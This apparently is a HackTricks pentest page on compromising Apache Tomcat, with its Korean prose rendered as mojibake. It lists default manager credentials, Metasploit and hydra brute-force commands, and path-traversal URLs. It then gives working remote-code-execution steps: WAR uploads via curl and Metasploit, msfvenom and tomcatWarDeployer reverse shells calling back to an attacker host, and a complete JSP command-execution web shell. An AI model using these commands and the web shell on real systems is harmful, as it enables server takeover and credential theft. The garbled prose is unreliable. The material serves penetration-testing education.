# Tomcat

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Discovery

* ì¼ë°˜ì ìœ¼ë¡œ **í¬íŠ¸ 8080**ì—ì„œ ì‹¤í–‰ë©ë‹ˆë‹¤.
* **ì¼ë°˜ì ì¸ Tomcat ì˜¤ë¥˜:**

<figure><img src="../../.gitbook/assets/image (1) (6).png" alt=""><figcaption></figcaption></figure>

## Enumeration

### **Version Identification**

Apache Tomcatì˜ ë²„ì „ì„ ì°¾ê¸° ìœ„í•´ ê°„ë‹¨í•œ ëª…ë ¹ì„ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
curl -s http://tomcat-site.local:8080/docs/ | grep Tomcat
```
ì´ê²ƒì€ ë¬¸ì„œ ì¸ë±ìŠ¤ í˜ì´ì§€ì—ì„œ "Tomcat"ì´ë¼ëŠ” ìš©ì–´ë¥¼ ê²€ìƒ‰í•˜ì—¬ HTML ì‘ë‹µì˜ ì œëª© íƒœê·¸ì—ì„œ ë²„ì „ì„ ë“œëŸ¬ëƒ…ë‹ˆë‹¤.

### **ë§¤ë‹ˆì € íŒŒì¼ ìœ„ì¹˜**

**`/manager`** ë° **`/host-manager`** ë””ë ‰í† ë¦¬ì˜ ì •í™•í•œ ìœ„ì¹˜ë¥¼ ì‹ë³„í•˜ëŠ” ê²ƒì€ ì¤‘ìš”í•©ë‹ˆë‹¤. ì´ë¦„ì´ ë³€ê²½ë  ìˆ˜ ìˆê¸° ë•Œë¬¸ì…ë‹ˆë‹¤. ì´ëŸ¬í•œ í˜ì´ì§€ë¥¼ ì°¾ê¸° ìœ„í•´ ë¬´ì°¨ë³„ ëŒ€ì… ê²€ìƒ‰ì„ ê¶Œì¥í•©ë‹ˆë‹¤.

### **ì‚¬ìš©ì ì´ë¦„ ì—´ê±°**

Tomcat 6ë³´ë‹¤ ì´ì „ ë²„ì „ì—ì„œëŠ” ë‹¤ìŒì„ í†µí•´ ì‚¬ìš©ì ì´ë¦„ì„ ì—´ê±°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
msf> use auxiliary/scanner/http/tomcat_enum
```
### **ê¸°ë³¸ ìê²© ì¦ëª…**

**`/manager/html`** ë””ë ‰í† ë¦¬ëŠ” WAR íŒŒì¼ì˜ ì—…ë¡œë“œ ë° ë°°í¬ë¥¼ í—ˆìš©í•˜ë¯€ë¡œ íŠ¹íˆ ë¯¼ê°í•©ë‹ˆë‹¤. ì´ ë””ë ‰í† ë¦¬ëŠ” ê¸°ë³¸ HTTP ì¸ì¦ìœ¼ë¡œ ë³´í˜¸ë˜ë©°, ì¼ë°˜ì ì¸ ìê²© ì¦ëª…ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

* admin:admin
* tomcat:tomcat
* admin:
* admin:s3cr3t
* tomcat:s3cr3t
* admin:tomcat

ì´ ìê²© ì¦ëª…ì€ ë‹¤ìŒì„ ì‚¬ìš©í•˜ì—¬ í…ŒìŠ¤íŠ¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
msf> use auxiliary/scanner/http/tomcat_mgr_login
```
ë˜ ë‹¤ë¥¸ ì£¼ëª©í•  ë§Œí•œ ë””ë ‰í† ë¦¬ëŠ” **`/manager/status`**ë¡œ, Tomcat ë° OS ë²„ì „ì„ í‘œì‹œí•˜ì—¬ ì·¨ì•½ì  ì‹ë³„ì— ë„ì›€ì„ ì¤ë‹ˆë‹¤.

### **ë¬´ì°¨ë³„ ëŒ€ì… ê³µê²©**

ê´€ë¦¬ì ë””ë ‰í† ë¦¬ì— ë¬´ì°¨ë³„ ëŒ€ì… ê³µê²©ì„ ì‹œë„í•˜ë ¤ë©´ ë‹¤ìŒì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
hydra -L users.txt -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -f 10.10.10.64 http-get /manager/html
```
Along with setting various parameters in Metasploit to target a specific host.

## Common Vulnerabilities

### **Password Backtrace Disclosure**

`/auth.jsp`ì— ì ‘ê·¼í•˜ë©´ ìš´ì´ ì¢‹ì„ ê²½ìš° ë°±íŠ¸ë ˆì´ìŠ¤ì—ì„œ ë¹„ë°€ë²ˆí˜¸ê°€ ë…¸ì¶œë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### **Double URL Encoding**

`mod_jk`ì˜ CVE-2007-1860 ì·¨ì•½ì ì€ ì´ì¤‘ URL ì¸ì½”ë”© ê²½ë¡œ íƒìƒ‰ì„ í—ˆìš©í•˜ì—¬, íŠ¹ë³„íˆ ì œì‘ëœ URLì„ í†µí•´ ê´€ë¦¬ ì¸í„°í˜ì´ìŠ¤ì— ë¬´ë‹¨ìœ¼ë¡œ ì ‘ê·¼í•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤.

Tomcatì˜ ê´€ë¦¬ ì›¹ì— ì ‘ê·¼í•˜ë ¤ë©´ ë‹¤ìŒìœ¼ë¡œ ì´ë™í•˜ì‹­ì‹œì˜¤: `pathTomcat/%252E%252E/manager/html`

### /examples

Apache Tomcat 4.xì—ì„œ 7.x ë²„ì „ì€ ì •ë³´ ìœ ì¶œ ë° êµì°¨ ì‚¬ì´íŠ¸ ìŠ¤í¬ë¦½íŒ…(XSS) ê³µê²©ì— ì·¨ì•½í•œ ì˜ˆì œ ìŠ¤í¬ë¦½íŠ¸ë¥¼ í¬í•¨í•˜ê³  ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ ìŠ¤í¬ë¦½íŠ¸ëŠ” í¬ê´„ì ìœ¼ë¡œ ë‚˜ì—´ë˜ì–´ ìˆìœ¼ë©°, ë¬´ë‹¨ ì ‘ê·¼ ë° ì ì¬ì  ì•…ìš© ì—¬ë¶€ë¥¼ í™•ì¸í•´ì•¼ í•©ë‹ˆë‹¤. [ìì„¸í•œ ì •ë³´ëŠ” ì—¬ê¸°ì—ì„œ í™•ì¸í•˜ì„¸ìš”](https://www.rapid7.com/db/vulnerabilities/apache-tomcat-example-leaks/)

* /examples/jsp/num/numguess.jsp
* /examples/jsp/dates/date.jsp
* /examples/jsp/snp/snoop.jsp
* /examples/jsp/error/error.html
* /examples/jsp/sessions/carts.html
* /examples/jsp/checkbox/check.html
* /examples/jsp/colors/colors.html
* /examples/jsp/cal/login.html
* /examples/jsp/include/include.jsp
* /examples/jsp/forward/forward.jsp
* /examples/jsp/plugin/plugin.jsp
* /examples/jsp/jsptoserv/jsptoservlet.jsp
* /examples/jsp/simpletag/foo.jsp
* /examples/jsp/mail/sendmail.jsp
* /examples/servlet/HelloWorldExample
* /examples/servlet/RequestInfoExample
* /examples/servlet/RequestHeaderExample
* /examples/servlet/RequestParamExample
* /examples/servlet/CookieExample
* /examples/servlet/JndiServlet
* /examples/servlet/SessionExample
* /tomcat-docs/appdev/sample/web/hello.jsp

### **Path Traversal Exploit**

ì¼ë¶€ [**Tomcatì˜ ì·¨ì•½í•œ êµ¬ì„±**](https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/)ì—ì„œëŠ” ê²½ë¡œ `/..;/`ë¥¼ ì‚¬ìš©í•˜ì—¬ Tomcatì˜ ë³´í˜¸ëœ ë””ë ‰í† ë¦¬ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì˜ˆë¥¼ ë“¤ì–´, `www.vulnerable.com/lalala/..;/manager/html`ì— ì ‘ê·¼í•˜ì—¬ **Tomcat ê´€ë¦¬ì** í˜ì´ì§€ì— ì ‘ê·¼í•  ìˆ˜ ìˆì„ ê²ƒì…ë‹ˆë‹¤.

**ë˜ ë‹¤ë¥¸ ë°©ë²•**ìœ¼ë¡œëŠ” ì´ íŠ¸ë¦­ì„ ì‚¬ìš©í•˜ì—¬ ë³´í˜¸ëœ ê²½ë¡œë¥¼ ìš°íšŒí•˜ëŠ” ê²ƒì´ë©°, `http://www.vulnerable.com/;param=value/manager/html`ì— ì ‘ê·¼í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.

## RCE

ë§ˆì§€ë§‰ìœ¼ë¡œ, Tomcat ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ ê´€ë¦¬ì— ì ‘ê·¼í•  ìˆ˜ ìˆë‹¤ë©´ **.war íŒŒì¼ì„ ì—…ë¡œë“œí•˜ê³  ë°°í¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (ì½”ë“œ ì‹¤í–‰)**.

### Limitations

**ì¶©ë¶„í•œ ê¶Œí•œ**(ì—­í• : **admin**, **manager**, **manager-script**)ì´ ìˆëŠ” ê²½ìš°ì—ë§Œ WAR íŒŒì¼ì„ ë°°í¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ ì„¸ë¶€ì •ë³´ëŠ” ì¼ë°˜ì ìœ¼ë¡œ `/usr/share/tomcat9/etc/tomcat-users.xml`ì— ì •ì˜ëœ _tomcat-users.xml_ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤ (ë²„ì „ë§ˆë‹¤ ë‹¤ë¥¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤) (ìì„¸í•œ ë‚´ìš©ì€ [POST ](tomcat.md#post)section).
```bash
# tomcat6-admin (debian) or tomcat6-admin-webapps (rhel) has to be installed

# deploy under "path" context path
curl --upload-file monshell.war -u 'tomcat:password' "http://localhost:8080/manager/text/deploy?path=/monshell"

# undeploy
curl "http://tomcat:Password@localhost:8080/manager/text/undeploy?path=/monshell"
```
### ë©”íƒ€ìŠ¤í”Œë¡œì‡
```bash
use exploit/multi/http/tomcat_mgr_upload
msf exploit(multi/http/tomcat_mgr_upload) > set rhost <IP>
msf exploit(multi/http/tomcat_mgr_upload) > set rport <port>
msf exploit(multi/http/tomcat_mgr_upload) > set httpusername <username>
msf exploit(multi/http/tomcat_mgr_upload) > set httppassword <password>
msf exploit(multi/http/tomcat_mgr_upload) > exploit
```
### MSFVenom Reverse Shell

1. ë°°í¬í•  war íŒŒì¼ ìƒì„±:
```bash
msfvenom -p java/shell_reverse_tcp LHOST=<LHOST_IP> LPORT=<LHOST_IP> -f war -o revshell.war
```
2. `revshell.war` íŒŒì¼ì„ ì—…ë¡œë“œí•˜ê³  ì ‘ê·¼í•©ë‹ˆë‹¤ (`/revshell/`):

### [tomcatWarDeployer.py](https://github.com/mgeeky/tomcatWarDeployer)ë¡œ ë°”ì¸ë“œ ë° ë¦¬ë²„ìŠ¤ ì…¸

ì¼ë¶€ ì‹œë‚˜ë¦¬ì˜¤ì—ì„œëŠ” ì´ ë°©ë²•ì´ ì‘ë™í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤ (ì˜ˆ: êµ¬ë²„ì „ì˜ sun)

#### ë‹¤ìš´ë¡œë“œ
```bash
git clone https://github.com/mgeeky/tomcatWarDeployer.git
```
#### ë¦¬ë²„ìŠ¤ ì…¸
```bash
./tomcatWarDeployer.py -U <username> -P <password> -H <ATTACKER_IP> -p <ATTACKER_PORT> <VICTIM_IP>:<VICTIM_PORT>/manager/html/
```
#### ë°”ì¸ë“œ ì…¸
```bash
./tomcatWarDeployer.py -U <username> -P <password> -p <bind_port> <victim_IP>:<victim_PORT>/manager/html/
```
### [Culsterd](https://github.com/hatRiot/clusterd) ì‚¬ìš©í•˜ê¸°
```bash
clusterd.py -i 192.168.1.105 -a tomcat -v 5.5 --gen-payload 192.168.1.6:4444 --deploy shell.war --invoke --rand-payload -o windows
```
### ìˆ˜ë™ ë°©ë²• - ì›¹ ì…¸

**index.jsp**ë¥¼ ë‹¤ìŒ [ë‚´ìš©](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp)ìœ¼ë¡œ ìƒì„±í•©ë‹ˆë‹¤:
```java
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
String output = "";
if(cmd != null) {
String s = null;
try {
Process p = Runtime.getRuntime().exec(cmd,null,null);
BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
while((s = sI.readLine()) != null) { output += s+"</br>"; }
}  catch(IOException e) {   e.printStackTrace();   }
}
%>
<pre><%=output %></pre>
```

```bash
mkdir webshell
cp index.jsp webshell
cd webshell
jar -cvf ../webshell.war *
webshell.war is created
# Upload it
```
ì´ê²ƒì„ ì„¤ì¹˜í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤ (ì—…ë¡œë“œ, ë‹¤ìš´ë¡œë“œ ë° ëª…ë ¹ ì‹¤í–‰ì„ í—ˆìš©í•©ë‹ˆë‹¤): [http://vonloesch.de/filebrowser.html](http://vonloesch.de/filebrowser.html)

### ìˆ˜ë™ ë°©ë²• 2

[ì´ê²ƒ](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp)ì™€ ê°™ì€ JSP ì›¹ ì…¸ì„ ê°€ì ¸ì™€ WAR íŒŒì¼ì„ ë§Œë“œì„¸ìš”:
```bash
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp
# When this file is uploaded to the manager GUI, the /backup application will be added to the table.
# Go to: http://tomcat-site.local:8180/backup/cmd.jsp
```
## POST

Tomcat ìê²© ì¦ëª… íŒŒì¼ì˜ ì´ë¦„ì€ _tomcat-users.xml_ì…ë‹ˆë‹¤.
```bash
find / -name tomcat-users.xml 2>/dev/null
```
Tomcat ìê²© ì¦ëª…ì„ ìˆ˜ì§‘í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:
```bash
msf> use post/multi/gather/tomcat_gather
msf> use post/windows/gather/enum_tomcat
```
## ë‹¤ë¥¸ í†°ìº£ ìŠ¤ìºë‹ ë„êµ¬

* [https://github.com/p0dalirius/ApacheTomcatScanner](https://github.com/p0dalirius/ApacheTomcatScanner)

## ì°¸ê³ ë¬¸í—Œ

* [https://github.com/simran-sankhala/Pentest-Tomcat](https://github.com/simran-sankhala/Pentest-Tomcat)
* [https://hackertarget.com/sample/nexpose-metasploitable-test.pdf](https://hackertarget.com/sample/nexpose-metasploitable-test.pdf)

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**ë””ìŠ¤ì½”ë“œ ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
